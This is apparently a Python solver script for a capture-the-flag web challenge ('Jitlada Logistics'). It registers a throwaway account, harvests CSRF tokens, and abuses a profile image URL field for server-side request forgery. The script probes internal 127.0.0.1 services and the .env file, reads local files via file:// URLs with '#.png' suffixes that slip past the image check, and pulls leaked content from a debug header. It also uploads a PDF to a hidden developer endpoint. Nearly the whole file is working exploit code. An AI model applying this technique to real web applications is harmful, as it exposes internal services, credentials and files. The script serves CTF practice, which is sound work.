#!/usr/bin/env python3
"""Jitlada Logistics SSRF solver — reads X-Debug-Message from internal fetches."""
import re, sys, random, io
import requests

BASE = sys.argv[1] if len(sys.argv) > 1 else "https://inst-30392.aegis-ctf.com"
UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"

s = requests.Session()
s.headers.update({"User-Agent": UA})

def register():
    u = f"pwn{random.randint(10000,99999)}"
    r = s.post(f"{BASE}/register", data={
        "username": u, "email": f"{u}@ex.com", "fullName": "Pwn",
        "phone": "0812345678", "company": "PwnCo",
        "password": "Password123!", "confirmPassword": "Password123!",
    }, allow_redirects=True, timeout=30)
    print("[+] user", u, r.url)
    return u

def csrf(path="/profile"):
    r = s.get(f"{BASE}{path}", timeout=30)
    m = re.search(r'name="csrf" value="([^"]+)"', r.text)
    if not m:
        raise RuntimeError(f"no csrf on {path}: {r.status_code}")
    return m.group(1)

def ssrf(url):
    token = csrf()
    r = s.post(f"{BASE}/profile", data={"csrf": token, "organizationImage": url},
               allow_redirects=False, timeout=30)
    debug = r.headers.get("X-Debug-Message", "")
    loc = r.headers.get("Location", "")
    print(f"[*] {url}")
    print(f"    Location: {loc}")
    if debug:
        print(f"    X-Debug-Message: {debug}")
    return debug, loc

def upload_pdf(data: bytes, name="inv.pdf"):
    token = csrf("/dev371/invoice22-upload")
    r = s.post(f"{BASE}/dev371/invoice22-upload", data={"csrf": token},
               files={"invoiceFile": (name, data, "application/pdf")},
               allow_redirects=False, timeout=60)
    print("[*] upload", r.status_code, r.headers.get("Location"), r.headers.get("X-Debug-Message"))
    if r.status_code == 200:
        flash = re.search(r'class="flash[^"]*">([^<]+)', r.text)
        print("    flash:", flash.group(1) if flash else None)
        # print any aegis flag
        flags = re.findall(r'aegis\{[^}]+\}', r.text)
        if flags:
            print("[!] FLAG", flags)
    return r

def main():
    register()
    # Discover via internal non-image responses
    for url in [
        "http://127.0.0.1:5000/x.png",
        "http://127.0.0.1:5000/flag#.png",
        "http://127.0.0.1:3000/flag#.png",
        "http://127.0.0.1:3000/flag.txt#.png",
        "http://127.0.0.1:3000/login#.png",
        "http://127.0.0.1:3000/dashboard#.png",
        "http://127.0.0.1:3000/dev371/invoice22-upload#.png",
        "http://127.0.0.1:3000/assets/jitlada-logistics-mark.svg#.png",
        "http://127.0.0.1:3000/package.json#.png",
        "http://127.0.0.1:3000/.env#.png",
        "file:///flag.txt#.png",
        "file:///flag#.png",
        "file:///app/flag.txt#.png",
    ]:
        try:
            debug, loc = ssrf(url)
            if debug and "aegis{" in debug:
                print("[!] FLAG IN DEBUG:", debug)
                return
        except Exception as e:
            print("err", e)

    # Hit developer portal
    r = s.get(f"{BASE}/dev371/invoice22-upload", timeout=30)
    print("[+] portal", r.status_code, "len", len(r.text))

    # Minimal PDF
    pdf = open("/home/kali/Lab/JitladaLogistics/payloads/ok.pdf", "rb").read()
    upload_pdf(pdf)

if __name__ == "__main__":
    main()
